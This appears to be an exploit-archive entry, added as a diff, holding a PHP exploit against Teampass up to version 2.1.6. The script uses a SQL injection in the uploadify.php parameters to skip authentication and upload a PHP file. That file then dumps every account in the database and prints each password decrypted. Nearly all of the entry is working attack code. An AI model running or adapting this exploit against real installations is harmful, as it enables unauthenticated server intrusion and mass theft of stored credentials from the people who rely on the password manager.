@@ -1,0 +1,80 @@
+id: 17916
+date: 04/02/2012
+title: Teampass <= v2.1.6 Arbitrary File Upload / Export decrypt passwords
+author: leviathan
+cves: 
+
+<?php
+# Exploit Title: Teampass <= v2.1.6 : Unauthenticated Arbitrary File Upload + Export decrypt passwords
+# Date: 2012-04-01
+# Author: leviathan (vulnerability discovered by Simon Leblanc : <https://github.com/nilsteampassnet/TeamPass/issues/67#issuecomment-4870428>)
+# Vendor or Software Link: https://github.com/nilsteampassnet/TeamPass
+# Version: <= 2.1.6
+# Category:: webapps
+# Tested on: GNU/Linux with TeamPass 2.1.5 and TeamPass 2.1.6
+# Demo site: 
+
+// The vulnerable website
+$base_url   = 'http://localhost';
+$url_folder = '/teampass';
+
+// The content of the file which be uploaded
+$hack_content = <<<EOF
+<?php
+\$_SESSION['CPM'] = 1; // to prevent a verification
+\$base_path = __DIR__.'/../'; // the file will be upload in the files folder
+include(\$base_path.'includes/settings.php');
+require_once(\$base_path.'sources/main.functions.php');
+require_once(\$base_path."sources/class.database.php");
+\$db = new Database(\$server, \$user, \$pass, \$database, \$pre);
+\$db->connect();
+
+// Get all accounts
+\$rows = \$db->fetch_all_array("
+	                   SELECT i.id AS id, i.restricted_to AS restricted_to, i.perso AS perso, i.label AS label, i.description AS description, i.pw AS pw, i.login AS login,
+	                       l.date AS date,
+	                       n.renewal_period AS renewal_period,
+	                       k.rand_key
+	                   FROM ".\$pre."items AS i
+	                   INNER JOIN ".\$pre."nested_tree AS n ON (i.id_tree = n.id)
+	                   INNER JOIN ".\$pre."log_items AS l ON (i.id = l.id_item)
+	                   INNER JOIN ".\$pre."keys AS k ON (i.id = k.id)
+	                   ORDER BY i.label ASC, l.date DESC
+                ");
+
+foreach( \$rows as \$reccord ) {
+  print_r(\$reccord);
+  \$pw = decrypt(\$reccord['pw']); // decrypt password
+  \$pw = substr(addslashes(\$pw), strlen(\$reccord['rand_key']));
+  echo "<br />pass : ".\$pw."<br />";
+  echo "<br />-------------------------------------------------<br />";
+}
+
+EOF
+;
+
+// Build hack file to send
+$hack_filename = 'get_pass_teampass.php';
+if (file_put_contents(__DIR__.DIRECTORY_SEPARATOR.$hack_filename, $hack_content) === false) {
+  die('Impossible to save the hack file');
+}
+
+
+$curl = curl_init();
+curl_setopt($curl, CURLOPT_URL, $base_url.$url_folder.'/includes/libraries/uploadify/uploadify.php?key_tempo=my_hack_key&user_id='.urlencode('0 UNION SELECT \'my_hack_key\''));
+curl_setopt($curl, CURLOPT_POST, true);
+$post = array(
+'Filedata' => '@'.__DIR__.DIRECTORY_SEPARATOR.$hack_filename,
+'type_upload' => 'import_items_from_csv',
+'folder' => $url_folder.'/files',
+);
+curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
+
+$response = curl_exec($curl);
+
+// print the list of all account
+echo file_get_contents($base_url.$url_folder.'/files/'.$hack_filename);
+
+
+
+#  0day.today [2023-03-22]  #
